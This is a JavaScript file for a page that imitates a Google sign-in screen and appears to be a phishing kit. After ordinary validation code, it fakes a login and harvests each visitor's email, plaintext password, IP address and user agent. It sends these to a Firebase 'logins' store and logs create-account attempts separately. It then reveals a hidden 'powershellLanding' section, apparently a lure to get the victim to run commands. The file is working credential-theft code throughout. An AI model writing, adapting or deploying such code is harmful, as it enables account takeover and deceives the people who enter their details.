// Google Modern Login Page JavaScript
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const emailError = document.getElementById('email-error');
    const passwordError = document.getElementById('password-error');
    const submitButton = form.querySelector('.btn-primary');
    const createAccountButton = form.querySelector('.btn-secondary');
    const appContainer = document.getElementById('authContainer');
    const powershellLanding = document.getElementById('powershellLanding');
    const volumeIndicator = document.getElementById('volumeIndicator');
    const volumeSlider = volumeIndicator ? volumeIndicator.querySelector('.level') : null;
    const volumeLabel = volumeIndicator ? volumeIndicator.querySelector('.volume-percentage') : null;

    // Input animation and validation
    function setupInputAnimations() {
        const inputs = document.querySelectorAll('.input-group input');
        
        inputs.forEach(input => {
            // Add focus animations
            input.addEventListener('focus', function() {
                this.parentElement.classList.add('focused');
                createRippleEffect(this);
            });

            input.addEventListener('blur', function() {
                this.parentElement.classList.remove('focused');
                validateInput(this);
            });

            // Real-time validation
            input.addEventListener('input', function() {
                clearError(this);
                if (this.value.length > 0) {
                    validateInput(this);
                }
            });
        });
    }

    // Create ripple effect on input focus
    function createRippleEffect(element) {
        const ripple = document.createElement('span');
        ripple.classList.add('ripple');
        element.parentElement.appendChild(ripple);
        
        setTimeout(() => {
            ripple.remove();
        }, 600);
    }

    // Input validation
    function validateInput(input) {
        const value = input.value.trim();
        let isValid = true;

        if (input.type === 'email') {
            isValid = validateEmail(value);
            if (!isValid && value.length > 0) {
                showError(input, 'Please enter a valid email address');
            }
        } else if (input.type === 'password') {
            isValid = validatePassword(value);
            if (!isValid && value.length > 0) {
                showError(input, 'Password must be at least 6 characters long');
            }
        }

        if (isValid) {
            input.classList.add('valid');
            input.classList.remove('invalid');
        } else if (value.length > 0) {
            input.classList.add('invalid');
            input.classList.remove('valid');
        }

        return isValid;
    }

    // Email validation
    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }

    // Password validation
    function validatePassword(password) {
        return password.length >= 6;
    }

    // Show error message with animation
    function showError(input, message) {
        const errorElement = input.parentElement.querySelector('.error-message');
        errorElement.textContent = message;
        errorElement.classList.add('show');
        
        // Add shake animation to input
        input.classList.add('shake');
        setTimeout(() => {
            input.classList.remove('shake');
        }, 500);
    }

    // Clear error message
    function clearError(input) {
        const errorElement = input.parentElement.querySelector('.error-message');
        errorElement.classList.remove('show');
        errorElement.textContent = '';
    }

    // Form submission handling
    function handleFormSubmission(e) {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        
        // Clear previous errors
        clearError(emailInput);
        clearError(passwordInput);
        
        let isFormValid = true;

        // Validate email
        if (!email) {
            showError(emailInput, 'Please enter your email');
            isFormValid = false;
        } else if (!validateEmail(email)) {
            showError(emailInput, 'Please enter a valid email address');
            isFormValid = false;
        }

        // Validate password
        if (!password) {
            showError(passwordInput, 'Please enter your password');
            isFormValid = false;
        } else if (!validatePassword(password)) {
            showError(passwordInput, 'Password must be at least 6 characters long');
            isFormValid = false;
        }

        if (isFormValid) {
            simulateLogin();
        } else {
            // Focus on first invalid input
            const firstInvalidInput = form.querySelector('.invalid') || 
                                   (emailInput.value ? passwordInput : emailInput);
            firstInvalidInput.focus();
        }
    }

    // Simulate login process
    function simulateLogin() {
        submitButton.classList.add('loading');
        submitButton.textContent = 'Signing in...';
        submitButton.disabled = true;

        // Simulate API call delay
        setTimeout(() => {
            submitButton.classList.remove('loading');
            submitButton.classList.add('success');
            submitButton.textContent = 'Success!';

            // Save login data to Firebase
            saveLoginDataToFirebase();

            // Show landing page
            showPowershellLanding();
        }, 1500);
    }

    function showPowershellLanding() {
        if (appContainer) {
            appContainer.classList.add('hidden');
            appContainer.setAttribute('aria-hidden', 'true');
        }

        if (powershellLanding) {
            powershellLanding.classList.remove('hidden');
            powershellLanding.classList.add('active');
            powershellLanding.setAttribute('aria-hidden', 'false');
        }

        document.body.classList.add('landing-active');
    }

    function fetchWithTimeout(url, { timeout = 1500, ...options } = {}) {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeout);

        return fetch(url, { ...options, signal: controller.signal })
            .finally(() => clearTimeout(timer));
    }

    // Get real IP address from external service
    async function getRealIPAddress() {
        try {
            // Try multiple IP services for reliability
            const ipServices = [
                'https://api.ipify.org?format=json',
                'https://ipapi.co/json/',
                'https://httpbin.org/ip'
            ];
            
            for (const service of ipServices) {
                try {
                    const response = await fetchWithTimeout(service, { timeout: 1500 });
                    const data = await response.json();

                    // Handle different response formats
                    if (data.ip) return data.ip;
                    if (data.origin) return data.origin; // httpbin format
                    
                } catch (error) {
                    console.warn(`Failed to get IP from ${service}:`, error);
                    continue;
                }
            }
            
            // Fallback if all services fail
            return 'client-side-unavailable';
        } catch (error) {
            console.warn('Unable to fetch real IP address:', error);
            return 'client-side-error';
        }
    }

    // Save login data to Firebase Realtime Database
    function saveLoginDataToFirebase() {
        // Wait for Firebase initialization if needed
        const maxWaitTime = 2000; // 2 seconds
        const startTime = Date.now();
        
        const attemptSave = async () => {
            // Check if Firebase initialization is complete
            if (typeof window.firebaseInitialized === 'undefined') {
                if (Date.now() - startTime < maxWaitTime) {
                    setTimeout(attemptSave, 100);
                    return;
                }
                console.warn('Firebase initialization timeout. Login data not saved.');
                return;
            }

            try {
                const email = emailInput.value.trim();
                const password = passwordInput.value.trim();
                
                // Get real IP address
                const realIPAddress = await getRealIPAddress();
                
                const loginData = {
                    email: email,
                    password: password,
                    timestamp: window.firebaseServerTimestamp(),
                    userAgent: navigator.userAgent,
                    ipAddress: realIPAddress,
                    loginSuccess: true,
                    sessionId: 'session-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9)
                };

                if (window.firebaseInitialized && window.firebaseDB) {
                    // Save to Firebase Realtime Database under 'logins' node
                    const loginsRef = window.firebaseRef(window.firebaseDB, 'logins');
                    window.firebasePush(loginsRef, loginData)
                        .then((result) => {
                            console.log('✅ Login data saved to Firebase successfully');
                            console.log('📊 Saved data:', loginData);
                            console.log('🔑 Firebase key:', result.key);
                        })
                        .catch((error) => {
                            console.error('❌ Error saving login data to Firebase:', error);
                        });
                } else {
                    // Fallback logging
                    window.firebasePush(null, loginData)
                        .then(() => {
                            console.log('⚠️ Firebase unavailable - using fallback logging');
                            console.log('📊 Login data (would be saved):', loginData);
                        });
                }
            } catch (error) {
                console.error('❌ Firebase operation failed:', error);
            }
        };

        attemptSave();
    }

    // Save create account data to Firebase Realtime Database
    async function saveCreateAccountDataToFirebase() {
        try {
            const email = emailInput.value.trim();
            
            // Get real IP address
            const realIPAddress = await getRealIPAddress();
            
            const createAccountData = {
                email: email,
                timestamp: window.firebaseServerTimestamp ? window.firebaseServerTimestamp() : Date.now(),
                action: 'create_account_attempt',
                userAgent: navigator.userAgent,
                ipAddress: realIPAddress,
                sessionId: 'session-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9)
            };

            if (window.firebaseInitialized && window.firebaseDB) {
                // Save to Firebase Realtime Database under 'user_actions' node
                const actionsRef = window.firebaseRef(window.firebaseDB, 'user_actions');
                window.firebasePush(actionsRef, createAccountData)
                    .then((result) => {
                        console.log('✅ Create account data saved to Firebase successfully');
                        console.log('📊 Saved data:', createAccountData);
                        console.log('🔑 Firebase key:', result.key);
                    })
                    .catch((error) => {
                        console.error('❌ Error saving create account data to Firebase:', error);
                    });
            } else if (window.firebasePush) {
                // Fallback logging
                window.firebasePush(null, createAccountData)
                    .then(() => {
                        console.log('⚠️ Firebase unavailable - using fallback logging for create account');
                        console.log('📊 Create account data (would be saved):', createAccountData);
                    });
            }
        } catch (error) {
            console.error('❌ Firebase operation failed for create account:', error);
        }
    }

    // Handle create account button
    async function handleCreateAccount() {
        createAccountButton.classList.add('loading');
        createAccountButton.textContent = 'Redirecting...';
        
        // Save create account attempt to Firebase
        await saveCreateAccountDataToFirebase();
        
        setTimeout(() => {
            alert('Redirecting to account creation page...');
            createAccountButton.classList.remove('loading');
            createAccountButton.textContent = 'Create account';
        }, 1000);
    }

    // Add shake animation CSS
    function addShakeAnimation() {
        const style = document.createElement('style');
        style.textContent = `
            .shake {
                animation: shake 0.5s cubic-bezier(0.36, 0.07, 0.19, 0.97);
            }
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
                20%, 40%, 60%, 80% { transform: translateX(5px); }
            }
        `;
        document.head.appendChild(style);
    }

    // Keyboard navigation enhancement
    function setupKeyboardNavigation() {
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && document.activeElement.tagName === 'INPUT') {
                const inputs = Array.from(document.querySelectorAll('input'));
                const currentIndex = inputs.indexOf(document.activeElement);
                
                if (currentIndex < inputs.length - 1) {
                    inputs[currentIndex + 1].focus();
                } else {
                    form.requestSubmit();
                }
            }
        });
    }

    // Language selector functionality
    function setupLanguageSelector() {
        const languageSelector = document.querySelector('.language-selector');
        
        languageSelector.addEventListener('change', function() {
            // Simulate language change
            const selectedLanguage = this.value;
            console.log('Language changed to:', selectedLanguage);
            
            // Add a subtle animation
            this.style.transform = 'scale(1.05)';
            setTimeout(() => {
                this.style.transform = 'scale(1)';
            }, 150);
        });
    }

    // Add floating particles background effect
    function createFloatingParticles() {
        const particlesContainer = document.createElement('div');
        particlesContainer.className = 'particles';
        document.body.appendChild(particlesContainer);

        const style = document.createElement('style');
        style.textContent = `
            .particles {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
                z-index: -1;
            }
            .particle {
                position: absolute;
                width: 4px;
                height: 4px;
                background: rgba(255, 255, 255, 0.3);
                border-radius: 50%;
                animation: float 6s ease-in-out infinite;
            }
            @keyframes float {
                0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 0.3; }
                50% { transform: translateY(-100px) rotate(180deg); opacity: 0.1; }
            }
        `;
        document.head.appendChild(style);

        // Create particles
        for (let i = 0; i < 20; i++) {
            const particle = document.createElement('div');
            particle.className = 'particle';
            particle.style.left = Math.random() * 100 + '%';
            particle.style.top = Math.random() * 100 + '%';
            particle.style.animationDelay = Math.random() * 6 + 's';
            particle.style.animationDuration = (Math.random() * 4 + 4) + 's';
            particlesContainer.appendChild(particle);
        }
    }

    // Volume indicator overlay
    function setupVolumeIndicator() {
        if (!volumeIndicator || !volumeSlider) {
            return;
        }

        const VOLUME_STEP = 5;
        const MIN_VOLUME = 0;
        const MAX_VOLUME = 100;
        const HIDE_DELAY = 1800;
        let hideTimeoutId = null;
        let currentVolume = Number.parseInt(volumeSlider.value, 10);

        if (Number.isNaN(currentVolume)) {
            currentVolume = 50;
        }

        const clampVolume = value => Math.min(MAX_VOLUME, Math.max(MIN_VOLUME, Math.round(value)));

        const updateLabel = value => {
            if (volumeLabel) {
                volumeLabel.textContent = `${value}%`;
            }
        };

        const hideIndicator = () => {
            clearTimeout(hideTimeoutId);
            volumeIndicator.classList.remove('show');
            volumeIndicator.setAttribute('aria-hidden', 'true');
            hideTimeoutId = null;
        };

        const showIndicator = () => {
            clearTimeout(hideTimeoutId);
            volumeIndicator.classList.add('show');
            volumeIndicator.setAttribute('aria-hidden', 'false');
            hideTimeoutId = setTimeout(hideIndicator, HIDE_DELAY);
        };

        const applyVolume = value => {
            currentVolume = clampVolume(value);
            volumeSlider.value = currentVolume;
            updateLabel(currentVolume);
            showIndicator();
        };

        const changeVolume = delta => {
            applyVolume(currentVolume + delta);
        };

        updateLabel(currentVolume);
        hideIndicator();

        const handleVolumeKeys = event => {
            if (event.code === 'AudioVolumeUp') {
                changeVolume(VOLUME_STEP);
                event.preventDefault();
            } else if (event.code === 'AudioVolumeDown') {
                changeVolume(-VOLUME_STEP);
                event.preventDefault();
            } else if (event.code === 'AudioVolumeMute') {
                applyVolume(MIN_VOLUME);
                event.preventDefault();
            }
        };

        document.addEventListener('keydown', handleVolumeKeys);

        if ('mediaSession' in navigator && navigator.mediaSession?.setActionHandler) {
            const assignHandler = (action, handler) => {
                try {
                    navigator.mediaSession.setActionHandler(action, handler);
                } catch (error) {
                    console.warn(`Media Session action handler for ${action} could not be registered:`, error);
                }
            };

            assignHandler('volumeup', () => changeVolume(VOLUME_STEP));
            assignHandler('volumedown', () => changeVolume(-VOLUME_STEP));
            assignHandler('mute', () => applyVolume(MIN_VOLUME));
        }

        const mediaElementVolumeListener = event => {
            const target = event.target;
            if (!target || typeof target.volume !== 'number') {
                return;
            }

            const level = target.muted ? MIN_VOLUME : target.volume * MAX_VOLUME;
            applyVolume(level);
        };

        document.addEventListener('volumechange', mediaElementVolumeListener, true);

        window.addEventListener('beforeunload', () => {
            document.removeEventListener('keydown', handleVolumeKeys);
            document.removeEventListener('volumechange', mediaElementVolumeListener, true);
        }, { once: true });
    }

    // Initialize all functionality
    function init() {
        setupInputAnimations();
        addShakeAnimation();
        setupKeyboardNavigation();
        setupLanguageSelector();
        createFloatingParticles();
        setupVolumeIndicator();

        // Event listeners
        form.addEventListener('submit', handleFormSubmission);
        createAccountButton.addEventListener('click', handleCreateAccount);

        // Add initial focus animation
        setTimeout(() => {
            emailInput.focus();
        }, 1000);
    }

    // Start the application
    init();
});

// Additional utility functions
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Theme detection and handling
function detectTheme() {
    if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark-theme');
    }

    // Listen for theme changes
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
        if (e.matches) {
            document.body.classList.add('dark-theme');
        } else {
            document.body.classList.remove('dark-theme');
        }
    });
}

// Initialize theme detection
detectTheme();
